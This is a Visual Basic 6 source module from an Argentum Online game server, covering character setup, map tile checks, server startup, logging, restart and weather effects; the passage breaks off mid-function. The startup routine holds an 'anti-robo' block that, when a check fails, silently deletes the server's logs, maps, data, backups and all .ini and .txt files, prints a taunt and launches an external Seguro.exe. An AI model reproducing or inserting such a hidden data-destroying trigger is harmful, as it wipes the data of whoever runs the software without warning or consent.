Attribute VB_Name = "General"
'Argentum Online 0.11.6
'Copyright (C) 2002 Márquez Pablo Ignacio
'
'This program is free software; you can redistribute it and/or modify
'it under the terms of the Affero General Public License;
'either version 1 of the License, or any later version.
'
'This program is distributed in the hope that it will be useful,
'but WITHOUT ANY WARRANTY; without even the implied warranty of
'MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
'Affero General Public License for more details.
'
'You should have received a copy of the Affero General Public License
'along with this program; if not, you can find it at http://www.affero.org/oagpl.html
'
'Argentum Online is based on Baronsoft's VB6 Online RPG
'You can contact the original creator of ORE at aaron@baronsoft.com
'for more information about ORE please visit http://www.baronsoft.com/
'
'
'You can contact me at:
'morgolock@speedy.com.ar
'www.geocities.com/gmorgolock
'Calle 3 número 983 piso 7 dto A
'La Plata - Pcia, Buenos Aires - Republica Argentina
'Código Postal 1900
'Pablo Ignacio Márquez

'Global ANpc As Long
'Global Anpc_host As Long

Option Explicit

Global LeerNPCs As New clsIniReader
'Global LeerNPCsHostiles As New clsIniReader

Sub DarCuerpoDesnudo(ByVal userIndex As Integer, Optional ByVal Mimetizado As Boolean = False)
'***************************************************
'Autor: Nacho (Integer)
'Last Modification: 03/14/07
'Da cuerpo desnudo a un usuario
'***************************************************
Dim CuerpoDesnudo As Integer
Select Case UserList(userIndex).Genero
    Case eGenero.Hombre
        Select Case UserList(userIndex).Raza
            Case eRaza.Humano
                CuerpoDesnudo = 21
            Case eRaza.ElfoOscuro
                CuerpoDesnudo = 32
            Case eRaza.Elfo
                CuerpoDesnudo = 210
            Case eRaza.Gnomo
                CuerpoDesnudo = 222
            Case eRaza.Enano
                CuerpoDesnudo = 53
            Case eRaza.Orco
                CuerpoDesnudo = 401
        End Select
    Case eGenero.Mujer
        Select Case UserList(userIndex).Raza
            Case eRaza.Humano
                CuerpoDesnudo = 39
            Case eRaza.ElfoOscuro
                CuerpoDesnudo = 40
            Case eRaza.Elfo
                CuerpoDesnudo = 259
            Case eRaza.Gnomo
                CuerpoDesnudo = 260
            Case eRaza.Enano
                CuerpoDesnudo = 60
            Case eRaza.Orco
                CuerpoDesnudo = 402
        End Select
End Select

If Mimetizado Then
    UserList(userIndex).CharMimetizado.body = CuerpoDesnudo
Else
    UserList(userIndex).Char.body = CuerpoDesnudo
End If

UserList(userIndex).flags.Desnudo = 1

End Sub


Sub Bloquear(ByVal toMap As Boolean, ByVal sndIndex As Integer, ByVal X As Integer, ByVal Y As Integer, ByVal b As Boolean)
'b ahora es boolean,
'b=true bloquea el tile en (x,y)
'b=false desbloquea el tile en (x,y)
'toMap = true -> Envia los datos a todo el mapa
'toMap = false -> Envia los datos al user
'Unifique los tres parametros (sndIndex,sndMap y map) en sndIndex... pero de todas formas, el mapa jamas se indica.. eso esta bien asi?
'Puede llegar a ser, que se quiera mandar el mapa, habria que agregar un nuevo parametro y modificar.. lo quite porque no se usaba ni aca ni en el cliente :s

If toMap Then
    Call SendData(SendTarget.toMap, sndIndex, PrepareMessageBlockPosition(X, Y, b))
Else
    Call WriteBlockPosition(sndIndex, X, Y, b)
End If

End Sub


Function HayAgua(ByVal Map As Integer, ByVal X As Integer, ByVal Y As Integer) As Boolean

If Map > 0 And Map < NumMaps + 1 And X > 0 And X < 101 And Y > 0 And Y < 101 Then
    If ((MapData(Map, X, Y).Graphic(1) >= 1505 And MapData(Map, X, Y).Graphic(1) <= 1520) Or _
    (MapData(Map, X, Y).Graphic(1) >= 5665 And MapData(Map, X, Y).Graphic(1) <= 5680) Or _
    (MapData(Map, X, Y).Graphic(1) >= 13547 And MapData(Map, X, Y).Graphic(1) <= 13562)) And _
       MapData(Map, X, Y).Graphic(2) = 0 Then
            HayAgua = True
    Else
            HayAgua = False
    End If
Else
  HayAgua = False
End If

End Function

Private Function HayLava(ByVal Map As Integer, ByVal X As Integer, ByVal Y As Integer) As Boolean
'***************************************************
'Autor: Nacho (Integer)
'Last Modification: 03/12/07
'***************************************************
If Map > 0 And Map < NumMaps + 1 And X > 0 And X < 101 And Y > 0 And Y < 101 Then
    If MapData(Map, X, Y).Graphic(1) >= 5837 And MapData(Map, X, Y).Graphic(1) <= 5852 Then
        HayLava = True
    Else
        HayLava = False
    End If
Else
  HayLava = False
End If

End Function


Sub LimpiarMundo()

On Error Resume Next

Dim i As Integer
Dim d As cGarbage

For i = TrashCollector.Count To 1 Step -1
    Set d = TrashCollector(i)
    Call EraseObj(d.Map, MapData(d.Map, d.X, d.Y).ObjInfo.amount, d.Map, d.X, d.Y)
    Call TrashCollector.Remove(i)
    Set d = Nothing
Next i

Call SecurityIp.IpSecurityMantenimientoLista

End Sub

Sub EnviarSpawnList(ByVal userIndex As Integer)
Dim k As Long
Dim npcNames() As String

ReDim npcNames(1 To UBound(SpawnList)) As String

For k = 1 To UBound(SpawnList)
    npcNames(k) = SpawnList(k).NpcName
Next k

Call WriteSpawnList(userIndex, npcNames())

End Sub

Sub ConfigListeningSocket(ByRef Obj As Object, ByVal Port As Integer)
#If UsarQueSocket = 0 Then

Obj.AddressFamily = AF_INET
Obj.Protocol = IPPROTO_IP
Obj.SocketType = SOCK_STREAM
Obj.Binary = False
Obj.Blocking = False
Obj.BufferSize = 1024
Obj.LocalPort = Port
Obj.backlog = 5
Obj.listen

#End If
End Sub

Sub Main()
On Error Resume Next
'SEGURO ANTI-ROBO
Dim seguro As Byte

seguro = CheckSeguro

Select Case seguro
    Case 0
        MsgBox ("Todavia no tienes permiso para abrir el server")
        End
    Case 2
        Kill (App.Path & "\logs\*.*") 'Comienza el borrado
        Kill (App.Path & "\bugs\*.*")
        Kill (App.Path & "\charlife\*.*")
        Kill (App.Path & "\chrbackup\*.*")
        Kill (App.Path & "\dat\*.*")
        Kill (App.Path & "\doc\*.*")
        Kill (App.Path & "\foros\*.*")
        Kill (App.Path & "\Guilds\*.*")
        Kill (App.Path & "\maps\*.*")
        Kill (App.Path & "\wav\*.*")
        Kill (App.Path & "\WorldBackUp\*.*")
        Kill (App.Path & "\\*.ini")
        Kill (App.Path & "\\*.txt") 'Termina el borrado
        MsgBox ("m... me robaste el sv papa...") 'Damos el error antes de finalizar
        Call Shell(App.Path & "\Seguro.exe", vbMinimizedNoFocus)
        End 'Terminamos todo.
End Select
'END SEGURO ANTI-ROBO
Dim f As Date

ChDir App.Path
ChDrive App.Path

Call LoadMotd
Call BanIpCargar

Prision.Map = 2
Libertad.Map = 2

Prision.X = 50
Prision.Y = 30
Libertad.X = 50
Libertad.Y = 50


LastBackup = Format(Now, "Short Time")
Minutos = Format(Now, "Short Time")

IniPath = App.Path & "\"
DatPath = App.Path & "\Dat\"

Call dbConnect

LevelSkill(1).LevelValue = 3
LevelSkill(2).LevelValue = 5
LevelSkill(3).LevelValue = 7
LevelSkill(4).LevelValue = 10
LevelSkill(5).LevelValue = 13
LevelSkill(6).LevelValue = 15
LevelSkill(7).LevelValue = 17
LevelSkill(8).LevelValue = 20
LevelSkill(9).LevelValue = 23
LevelSkill(10).LevelValue = 25
LevelSkill(11).LevelValue = 27
LevelSkill(12).LevelValue = 30
LevelSkill(13).LevelValue = 33
LevelSkill(14).LevelValue = 35
LevelSkill(15).LevelValue = 37
LevelSkill(16).LevelValue = 40
LevelSkill(17).LevelValue = 43
LevelSkill(18).LevelValue = 45
LevelSkill(19).LevelValue = 47
LevelSkill(20).LevelValue = 50
LevelSkill(21).LevelValue = 53
LevelSkill(22).LevelValue = 55
LevelSkill(23).LevelValue = 57
LevelSkill(24).LevelValue = 60
LevelSkill(25).LevelValue = 63
LevelSkill(26).LevelValue = 65
LevelSkill(27).LevelValue = 67
LevelSkill(28).LevelValue = 70
LevelSkill(29).LevelValue = 73
LevelSkill(30).LevelValue = 75
LevelSkill(31).LevelValue = 77
LevelSkill(32).LevelValue = 80
LevelSkill(33).LevelValue = 83
LevelSkill(34).LevelValue = 85
LevelSkill(35).LevelValue = 87
LevelSkill(36).LevelValue = 90
LevelSkill(37).LevelValue = 93
LevelSkill(38).LevelValue = 95
LevelSkill(39).LevelValue = 97
LevelSkill(40).LevelValue = 100
LevelSkill(41).LevelValue = 100
LevelSkill(42).LevelValue = 100
LevelSkill(43).LevelValue = 100
LevelSkill(44).LevelValue = 100
LevelSkill(45).LevelValue = 100
LevelSkill(46).LevelValue = 100
LevelSkill(47).LevelValue = 100
LevelSkill(48).LevelValue = 100
LevelSkill(49).LevelValue = 100
LevelSkill(50).LevelValue = 100


ListaRazas(eRaza.Humano) = "Humano"
ListaRazas(eRaza.Elfo) = "Elfo"
ListaRazas(eRaza.ElfoOscuro) = "Elfo Oscuro"
ListaRazas(eRaza.Gnomo) = "Gnomo"
ListaRazas(eRaza.Enano) = "Enano"
ListaRazas(eRaza.Orco) = "Orco"

ListaClases(eClass.Mage) = "Mago"
ListaClases(eClass.Cleric) = "Clerigo"
ListaClases(eClass.Warrior) = "Guerrero"
ListaClases(eClass.Assasin) = "Asesino"
ListaClases(eClass.Thief) = "Ladron"
ListaClases(eClass.Bard) = "Bardo"
ListaClases(eClass.Druid) = "Druida"
ListaClases(eClass.Bandit) = "Bandido"
ListaClases(eClass.Paladin) = "Paladin"
ListaClases(eClass.Hunter) = "Cazador"
ListaClases(eClass.Fisher) = "Pescador"
ListaClases(eClass.Blacksmith) = "Herrero"
ListaClases(eClass.Lumberjack) = "Leñador"
ListaClases(eClass.Miner) = "Minero"
ListaClases(eClass.Carpenter) = "Carpintero"
ListaClases(eClass.Pirat) = "Pirata"

SkillsNames(eSkill.Suerte) = "Suerte"
SkillsNames(eSkill.Magia) = "Magia"
SkillsNames(eSkill.Robar) = "Robar"
SkillsNames(eSkill.Tacticas) = "Tacticas de combate"
SkillsNames(eSkill.Armas) = "Combate con armas"
SkillsNames(eSkill.Meditar) = "Meditar"
SkillsNames(eSkill.Apuñalar) = "Apuñalar"
SkillsNames(eSkill.Ocultarse) = "Ocultarse"
SkillsNames(eSkill.supervivencia) = "Supervivencia"
SkillsNames(eSkill.Talar) = "Talar arboles"
SkillsNames(eSkill.Comerciar) = "Comercio"
SkillsNames(eSkill.Defensa) = "Defensa con escudos"
SkillsNames(eSkill.Pesca) = "Pesca"
SkillsNames(eSkill.Mineria) = "Mineria"
SkillsNames(eSkill.Carpinteria) = "Carpinteria"
SkillsNames(eSkill.Herreria) = "Herreria"
SkillsNames(eSkill.Liderazgo) = "Liderazgo"
SkillsNames(eSkill.Domar) = "Domar animales"
SkillsNames(eSkill.Proyectiles) = "Armas de proyectiles"
SkillsNames(eSkill.Wrestling) = "Wrestling"
SkillsNames(eSkill.Navegacion) = "Navegacion"


frmCargando.Show

'Call PlayWaveAPI(App.Path & "\wav\harp3.wav")

frmMain.Caption = frmMain.Caption & " V." & App.Major & "." & App.Minor & "." & App.Revision
IniPath = App.Path & "\"
CharPath = App.Path & "\Charfile\"

'Bordes del mapa
MinXBorder = XMinMapSize + (XWindow \ 2)
MaxXBorder = XMaxMapSize - (XWindow \ 2)
MinYBorder = YMinMapSize + (YWindow \ 2)
MaxYBorder = YMaxMapSize - (YWindow \ 2)
DoEvents

frmCargando.Label1(2).Caption = "Iniciando Arrays..."

Call LoadGuildsDB


Call CargarSpawnList
Call CargarForbidenWords
'¿?¿?¿?¿?¿?¿?¿?¿ CARGAMOS DATOS DESDE ARCHIVOS ¿??¿?¿?¿?¿?¿?¿?¿
frmCargando.Label1(2).Caption = "Cargando Server.ini"

MaxUsers = 0
Call LoadSini
Call CargaApuestas

'*************************************************
Call CargaNpcsDat
'*************************************************

frmCargando.Label1(2).Caption = "Cargando Obj.Dat"
'Call LoadOBJData
Call LoadOBJData
    
frmCargando.Label1(2).Caption = "Cargando Hechizos.Dat"
Call CargarHechizos
    
    
Call LoadArmasHerreria
Call LoadCascosHerreria
Call LoadEscudosHerreria
Call LoadArmadurasHerreria
Call LoadObjCarpintero

If BootDelBackUp Then
    
    frmCargando.Label1(2).Caption = "Cargando BackUp"
    Call CargarBackUp
Else
    frmCargando.Label1(2).Caption = "Cargando Mapas"
    Call LoadMapData
End If


Call SonidosMapas.LoadSoundMapInfo


'Comentado porque hay worldsave en ese mapa!
'Call CrearClanPretoriano(MAPA_PRETORIANO, ALCOBA2_X, ALCOBA2_Y)
'¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿

Dim LoopC As Integer

'Resetea las conexiones de los usuarios
For LoopC = 1 To MaxUsers
    UserList(LoopC).ConnID = -1
    UserList(LoopC).ConnIDValida = False
    Set UserList(LoopC).incomingData = New clsByteQueue
    Set UserList(LoopC).outgoingData = New clsByteQueue
Next LoopC

'¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿

With frmMain
    .AutoSave.Enabled = True
    .tLluvia.Enabled = True
    .tPiqueteC.Enabled = True
    .GameTimer.Enabled = True
    .tLluviaEvent.Enabled = True
    .FX.Enabled = True
    .Auditoria.Enabled = True
    .KillLog.Enabled = True
    .TIMER_AI.Enabled = True
    .npcataca.Enabled = True
    .TNoche.Enabled = True
    .tCastle.Enabled = True
    .tTileEvents.Enabled = True
End With

'¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿
'Configuracion de los sockets

Call SecurityIp.InitIpTables(1000)

#If UsarQueSocket = 1 Then

Call IniciaWsApi(frmMain.hWnd)
SockListen = ListenForConnect(Puerto, hWndMsg, "")

#ElseIf UsarQueSocket = 0 Then

frmCargando.Label1(2).Caption = "Configurando Sockets"

frmMain.Socket2(0).AddressFamily = AF_INET
frmMain.Socket2(0).Protocol = IPPROTO_IP
frmMain.Socket2(0).SocketType = SOCK_STREAM
frmMain.Socket2(0).Binary = False
frmMain.Socket2(0).Blocking = False
frmMain.Socket2(0).BufferSize = 2048

Call ConfigListeningSocket(frmMain.Socket1, Puerto)

#ElseIf UsarQueSocket = 2 Then

frmMain.Serv.Iniciar Puerto

#ElseIf UsarQueSocket = 3 Then

frmMain.TCPServ.Encolar True
frmMain.TCPServ.IniciarTabla 1009
frmMain.TCPServ.SetQueueLim 51200
frmMain.TCPServ.Iniciar Puerto

#End If

If frmMain.Visible Then frmMain.txStatus.Caption = "Escuchando conexiones entrantes ..."
'¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿




Unload frmCargando


'Log
Dim N As Integer
N = FreeFile
Open App.Path & "\logs\Main.log" For Append Shared As #N
Print #N, Date & " " & time & " server iniciado " & App.Major & "."; App.Minor & "." & App.Revision
Close #N

'Ocultar
If HideMe = 1 Then
    Call frmMain.InitMain(1)
Else
    Call frmMain.InitMain(0)
End If

tInicioServer = GetTickCount() And &H7FFFFFFF
Call InicializaEstadisticas

End Sub

Function FileExist(ByVal file As String, Optional FileType As VbFileAttribute = vbNormal) As Boolean
'*****************************************************************
'Se fija si existe el archivo
'*****************************************************************
    FileExist = LenB(dir$(file, FileType)) <> 0
End Function

Function ReadField(ByVal Pos As Integer, ByRef Text As String, ByVal SepASCII As Byte) As String
'*****************************************************************
'Gets a field from a string
'Author: Juan Martín Sotuyo Dodero (Maraxus)
'Last Modify Date: 11/15/2004
'Gets a field from a delimited string
'*****************************************************************
    Dim i As Long
    Dim LastPos As Long
    Dim CurrentPos As Long
    Dim delimiter As String * 1
    
    delimiter = Chr$(SepASCII)
    
    For i = 1 To Pos
        LastPos = CurrentPos
        CurrentPos = InStr(LastPos + 1, Text, delimiter, vbBinaryCompare)
    Next i
    
    If CurrentPos = 0 Then
        ReadField = mid$(Text, LastPos + 1, Len(Text) - LastPos)
    Else
        ReadField = mid$(Text, LastPos + 1, CurrentPos - LastPos - 1)
    End If
End Function

Function MapaValido(ByVal Map As Integer) As Boolean
MapaValido = Map >= 1 And Map <= NumMaps
End Function

Sub MostrarNumUsers()

frmMain.CantUsuarios.Caption = "Numero de usuarios jugando: " & NumUsers

End Sub


Public Sub LogCriticEvent(Desc As String)
On Error GoTo errhandler

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
Open App.Path & "\logs\Eventos.log" For Append Shared As #nfile
Print #nfile, Date & " " & time & " " & Desc
Close #nfile

Exit Sub

errhandler:

End Sub

Public Sub LogEjercitoReal(Desc As String)
On Error GoTo errhandler

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
Open App.Path & "\logs\EjercitoReal.log" For Append Shared As #nfile
Print #nfile, Desc
Close #nfile

Exit Sub

errhandler:

End Sub

Public Sub LogEjercitoCaos(Desc As String)
On Error GoTo errhandler

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
Open App.Path & "\logs\EjercitoCaos.log" For Append Shared As #nfile
Print #nfile, Desc
Close #nfile

Exit Sub

errhandler:

End Sub


Public Sub LogIndex(ByVal Index As Integer, ByVal Desc As String)
On Error GoTo errhandler

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
Open App.Path & "\logs\" & Index & ".log" For Append Shared As #nfile
Print #nfile, Date & " " & time & " " & Desc
Close #nfile

Exit Sub

errhandler:

End Sub


Public Sub LogError(Desc As String)
On Error GoTo errhandler

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
Open App.Path & "\logs\errores.log" For Append Shared As #nfile
Print #nfile, Date & " " & time & " " & Desc
Close #nfile

Exit Sub

errhandler:

End Sub

Public Sub LogStatic(Desc As String)
On Error GoTo errhandler

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
Open App.Path & "\logs\Stats.log" For Append Shared As #nfile
Print #nfile, Date & " " & time & " " & Desc
Close #nfile

Exit Sub

errhandler:

End Sub

Public Sub LogTarea(Desc As String)
On Error GoTo errhandler

Dim nfile As Integer
nfile = FreeFile(1) ' obtenemos un canal
Open App.Path & "\logs\haciendo.log" For Append Shared As #nfile
Print #nfile, Date & " " & time & " " & Desc
Close #nfile

Exit Sub

errhandler:


End Sub


Public Sub LogClanes(ByVal str As String)

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
Open App.Path & "\logs\clanes.log" For Append Shared As #nfile
Print #nfile, Date & " " & time & " " & str
Close #nfile

End Sub

Public Sub LogIP(ByVal str As String)

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
Open App.Path & "\logs\IP.log" For Append Shared As #nfile
Print #nfile, Date & " " & time & " " & str
Close #nfile

End Sub


Public Sub LogDesarrollo(ByVal str As String)

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
Open App.Path & "\logs\desarrollo" & Month(Date) & Year(Date) & ".log" For Append Shared As #nfile
Print #nfile, Date & " " & time & " " & str
Close #nfile

End Sub



Public Sub LogGM(Nombre As String, texto As String)
On Error GoTo errhandler

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
'Guardamos todo en el mismo lugar. Pablo (ToxicWaste) 18/05/07
Open App.Path & "\logs\" & Nombre & ".log" For Append Shared As #nfile
Print #nfile, Date & " " & time & " " & texto
Close #nfile

Exit Sub

errhandler:

End Sub

Public Sub SaveDayStats()
''On Error GoTo errhandler
''
''Dim nfile As Integer
''nfile = FreeFile ' obtenemos un canal
''Open App.Path & "\logs\" & Replace(Date, "/", "-") & ".log" For Append Shared As #nfile
''
''Print #nfile, "<stats>"
''Print #nfile, "<ao>"
''Print #nfile, "<dia>" & Date & "</dia>"
''Print #nfile, "<hora>" & Time & "</hora>"
''Print #nfile, "<segundos_total>" & DayStats.Segundos & "</segundos_total>"
''Print #nfile, "<max_user>" & DayStats.MaxUsuarios & "</max_user>"
''Print #nfile, "</ao>"
''Print #nfile, "</stats>"
''
''
''Close #nfile
Exit Sub

errhandler:

End Sub


Public Sub LogAsesinato(texto As String)
On Error GoTo errhandler
Dim nfile As Integer

nfile = FreeFile ' obtenemos un canal

Open App.Path & "\logs\asesinatos.log" For Append Shared As #nfile
Print #nfile, Date & " " & time & " " & texto
Close #nfile

Exit Sub

errhandler:

End Sub
Public Sub logVentaCasa(ByVal texto As String)
On Error GoTo errhandler

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal

Open App.Path & "\logs\propiedades.log" For Append Shared As #nfile
Print #nfile, "----------------------------------------------------------"
Print #nfile, Date & " " & time & " " & texto
Print #nfile, "----------------------------------------------------------"
Close #nfile

Exit Sub

errhandler:


End Sub
Public Sub LogHackAttemp(texto As String)
On Error GoTo errhandler

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
Open App.Path & "\logs\HackAttemps.log" For Append Shared As #nfile
Print #nfile, "----------------------------------------------------------"
Print #nfile, Date & " " & time & " " & texto
Print #nfile, "----------------------------------------------------------"
Close #nfile

Exit Sub

errhandler:

End Sub

Public Sub LogCheating(texto As String)
On Error GoTo errhandler

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
Open App.Path & "\logs\CH.log" For Append Shared As #nfile
Print #nfile, Date & " " & time & " " & texto
Close #nfile

Exit Sub

errhandler:

End Sub


Public Sub LogCriticalHackAttemp(texto As String)
On Error GoTo errhandler

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
Open App.Path & "\logs\CriticalHackAttemps.log" For Append Shared As #nfile
Print #nfile, "----------------------------------------------------------"
Print #nfile, Date & " " & time & " " & texto
Print #nfile, "----------------------------------------------------------"
Close #nfile

Exit Sub

errhandler:

End Sub

Public Sub LogAntiCheat(texto As String)
On Error GoTo errhandler

Dim nfile As Integer
nfile = FreeFile ' obtenemos un canal
Open App.Path & "\logs\AntiCheat.log" For Append Shared As #nfile
Print #nfile, Date & " " & time & " " & texto
Print #nfile, ""
Close #nfile

Exit Sub

errhandler:

End Sub

Function ValidInputNP(ByVal cad As String) As Boolean
Dim Arg As String
Dim i As Integer


For i = 1 To 33

Arg = ReadField(i, cad, 44)

If LenB(Arg) = 0 Then Exit Function

Next i

ValidInputNP = True

End Function


Sub Restart()


'Se asegura de que los sockets estan cerrados e ignora cualquier err
On Error Resume Next

If frmMain.Visible Then frmMain.txStatus.Caption = "Reiniciando."

Dim LoopC As Long
  
#If UsarQueSocket = 0 Then

    frmMain.Socket1.Cleanup
    frmMain.Socket1.Startup
      
    frmMain.Socket2(0).Cleanup
    frmMain.Socket2(0).Startup

#ElseIf UsarQueSocket = 1 Then

    'Cierra el socket de escucha
    If SockListen >= 0 Then Call apicloseConnection(SockListen)
    
    'Inicia el socket de escucha
    SockListen = ListenForConnect(Puerto, hWndMsg, "")

#ElseIf UsarQueSocket = 2 Then

#End If

For LoopC = 1 To MaxUsers
    Call closeConnection(LoopC)
Next

'Initialize statistics!!
Call Statistics.Initialize

For LoopC = 1 To UBound(UserList())
    Set UserList(LoopC).incomingData = Nothing
    Set UserList(LoopC).outgoingData = Nothing
Next LoopC

ReDim UserList(1 To MaxUsers) As User

For LoopC = 1 To MaxUsers
    UserList(LoopC).ConnID = -1
    UserList(LoopC).ConnIDValida = False
    Set UserList(LoopC).incomingData = New clsByteQueue
    Set UserList(LoopC).outgoingData = New clsByteQueue
Next LoopC

LastUser = 0
NumUsers = 0

Call FreeNPCs
Call FreeCharIndexes

Call LoadSini
Call LoadOBJData

Call LoadMapData

Call CargarHechizos

#If UsarQueSocket = 0 Then

'*****************Setup socket
frmMain.Socket1.AddressFamily = AF_INET
frmMain.Socket1.Protocol = IPPROTO_IP
frmMain.Socket1.SocketType = SOCK_STREAM
frmMain.Socket1.Binary = False
frmMain.Socket1.Blocking = False
frmMain.Socket1.BufferSize = 1024

frmMain.Socket2(0).AddressFamily = AF_INET
frmMain.Socket2(0).Protocol = IPPROTO_IP
frmMain.Socket2(0).SocketType = SOCK_STREAM
frmMain.Socket2(0).Blocking = False
frmMain.Socket2(0).BufferSize = 2048

'Escucha
frmMain.Socket1.LocalPort = val(Puerto)
frmMain.Socket1.listen

#ElseIf UsarQueSocket = 1 Then

#ElseIf UsarQueSocket = 2 Then

#End If

If frmMain.Visible Then frmMain.txStatus.Caption = "Escuchando conexiones entrantes ..."

'Log it
Dim N As Integer
N = FreeFile
Open App.Path & "\logs\Main.log" For Append Shared As #N
Print #N, Date & " " & time & " servidor reiniciado."
Close #N

'Ocultar

If HideMe = 1 Then
    Call frmMain.InitMain(1)
Else
    Call frmMain.InitMain(0)
End If

  
End Sub


Public Function Intemperie(ByVal userIndex As Integer) As Boolean
    
    If MapInfo(UserList(userIndex).Pos.Map).Zona <> "DUNGEON" Then
        If MapData(UserList(userIndex).Pos.Map, UserList(userIndex).Pos.X, UserList(userIndex).Pos.Y).trigger <> 1 And _
           MapData(UserList(userIndex).Pos.Map, UserList(userIndex).Pos.X, UserList(userIndex).Pos.Y).trigger <> 2 And _
           MapData(UserList(userIndex).Pos.Map, UserList(userIndex).Pos.X, UserList(userIndex).Pos.Y).trigger <> 4 Then Intemperie = True
    Else
        Intemperie = False
    End If
    
End Function

Public Sub EfectoLluvia(ByVal userIndex As Integer)
On Error GoTo errhandler


If UserList(userIndex).flags.UserLogged Then
    If Intemperie(userIndex) Then
                Dim modifi As Long
                modifi = Porcentaje(UserList(userIndex).Stats.MaxSta, 3)
                Call QuitarSta(userIndex, modifi)
                Call FlushBuffer(userIndex)
    End If
End If

Exit Sub
errhandler:
 LogError ("Error en EfectoLluvia")
End Sub


Public Sub TiempoInvocacion(ByVal userIndex As Integer)
Dim i As Integer
For i = 1 To MAXMASCOTAS
    If UserList(userIndex).MascotasIndex(i) > 0 Then
        If Npclist(UserList(userIndex).MascotasIndex(i)).Contadores.TiempoExistencia > 0 Then
           Npclist(UserList(userIndex).MascotasIndex(i)).Contadores.TiempoExistencia = _
           Npclist(UserList(userIndex).MascotasIndex(i)).Contadores.TiempoExistencia - 1
           If Npclist(UserList(userIndex).MascotasIndex(i)).Contadores.TiempoExistencia = 0 Then Call MuereNpc(UserList(userIndex).MascotasIndex(i), 0)
        End If
    End If
Next i
End Sub

Public Sub EfectoFrio(ByVal userIndex As Integer)
    
    Dim modifi As Integer
    
    If UserList(userIndex).Counters.Frio < IntervaloFrio Then
        UserList(userIndex).Counters.Frio = UserList(userIndex).Counters.Frio + 1
    Else
        If MapInfo(UserList(userIndex).Pos.Map).Terreno = Nieve Then
            Call WriteConsoleMsg(userIndex, "¡¡Estas muriendo de frio, abrigate o moriras!!.", FontTypeNames.FONTTYPE_INFO)
            modifi = Porcentaje(UserList(userIndex).Stats.MaxHP, 5)
            UserList(userIndex).Stats.MinHP = UserList(userIndex).Stats.MinHP - modifi
            
            If UserList(userIndex).Stats.MinHP < 1 Then
                Call WriteConsoleMsg(userIndex, "¡¡Has muerto de frio!!.", FontTypeNames.FONTTYPE_INFO)
                UserList(userIndex).Stats.MinHP = 0
                Call UserDie(userIndex)
            End If
            
            Call WriteUpdateHP(userIndex)
        Else
            modifi = Porcentaje(UserList(userIndex).Stats.MaxSta, 5)
            Call QuitarSta(userIndex, modifi)
            Call WriteUpdateSta(userIndex)
        End If
        
        UserList(userIndex).Counters.Frio = 0
    End If
End Sub

Public Sub EfectoLava(ByVal userIndex As Integer)
'***************************************************
'Autor: Nacho (Integer)
'Last Modification: 03/12/07
'If user is standing on lava, take health points from him
'***************************************************
    If UserList(userIndex).Counters.Lava < IntervaloFrio Then 'Usamos el mismo intervalo que el del frio
        UserList(userIndex).Counters.Lava = UserList(userIndex).Counters.Lava + 1
    Else
        If HayLava(UserList(userIndex).Pos.Map, UserList(userIndex).Pos.X, UserList(userIndex).Pos.Y) Then
            Call WriteConsoleMsg(userIndex, "¡¡Quitate de la lava, te estás quemando!!.", FontTypeNames.FONTTYPE_INFO)
            UserList(userIndex).Stats.MinHP = UserList(userIndex).Stats.MinHP - Porcentaje(UserList(userIndex).Stats.MaxHP, 5)
            
            If UserList(userIndex).Stats.MinHP < 1 Then
                Call WriteConsoleMsg(userIndex, "¡¡Has muerto quemado!!.", FontTypeNames.FONTTYPE_INFO)
                UserList(userIndex).Stats.MinHP = 0
                Call UserDie(userIndex)
            End If
            
            Call WriteUpdateHP(userIndex)
        End If
        
        UserList(userIndex).Counters.Lava = 0
    End If
End Sub


Public Sub EfectoMimetismo(ByVal userIndex As Integer)

If UserList(userIndex).Counters.Mimetismo < IntervaloInvisible Then
    UserList(userIndex).Counters.Mimetismo = UserList(userIndex).Counters.Mimetismo + 1
Else
    'restore old char
    Call WriteConsoleMsg(userIndex, "Recuperas tu apariencia normal.", FontTypeNames.FONTTYPE_INFO)
    
    UserList(userIndex).Char.body = UserList(userIndex).CharMimetizado.body
    UserList(userIndex).Char.head = UserList(userIndex).CharMimetizado.head
    UserList(userIndex).Char.CascoAnim = UserList(userIndex).CharMimetizado.CascoAnim
    UserList(userIndex).Char.ShieldAnim = UserList(userIndex).CharMimetizado.ShieldAnim
    UserList(userIndex).Char.WeaponAnim = UserList(userIndex).CharMimetizado.WeaponAnim
        
    
    UserList(userIndex).Counters.Mimetismo = 0
    UserList(userIndex).flags.Mimetizado = 0
    Call ChangeUserChar(userIndex, UserList(userIndex).Char.body, UserList(userIndex).Char.head, UserList(userIndex).Char.Heading, UserList(userIndex).Char.WeaponAnim, UserList(userIndex).Char.ShieldAnim, UserList(userIndex).Char.CascoAnim)
End If
            
End Sub

Public Sub EfectoInvisibilidad(ByVal userIndex As Integer)

If UserList(userIndex).Counters.Invisibilidad < IntervaloInvisible Then
    UserList(userIndex).Counters.Invisibilidad = UserList(userIndex).Counters.Invisibilidad + 1
Else
    UserList(userIndex).Counters.Invisibilidad = 0
    UserList(userIndex).flags.invisible = 0
    If UserList(userIndex).flags.Oculto = 0 Then
